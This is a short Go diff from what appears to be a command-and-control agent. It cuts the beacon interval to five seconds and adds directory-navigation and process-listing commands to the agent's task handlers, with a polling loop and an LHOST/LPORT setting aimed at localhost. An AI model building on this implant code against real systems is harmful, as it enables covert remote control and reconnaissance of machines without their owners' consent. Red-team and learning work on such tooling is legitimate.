@@ -23,7 +23,6 @@ var (
 func main() {
 	LHOST := "localhost"
 	LPORT := 8000
-	SLEEP := 30
 	generateMetadata()
 	loadAgentCommands()
 	commModule = models.NewHttpCommModule(LHOST, LPORT)
@@ -36,7 +35,7 @@ func main() {
 		select {
 		case <-done:
 			return
-		case <-time.After(time.Second * time.Duration(SLEEP)):
+		case <-time.After(time.Second * 5):
 			tasks, ok := commModule.RecvData()
 			if ok {
 				handleTasks(tasks)
@@ -138,4 +137,8 @@ func generateMetadata() {
 
 func loadAgentCommands() {
 	cmds = append(cmds, &commands.TestCommand{})
+	cmds = append(cmds, &commands.ChangeDirectory{})
+	cmds = append(cmds, &commands.PrintWorkingDirectory{})
+	cmds = append(cmds, &commands.ListDirectory{})
+	cmds = append(cmds, &commands.ListProcesses{})
 }
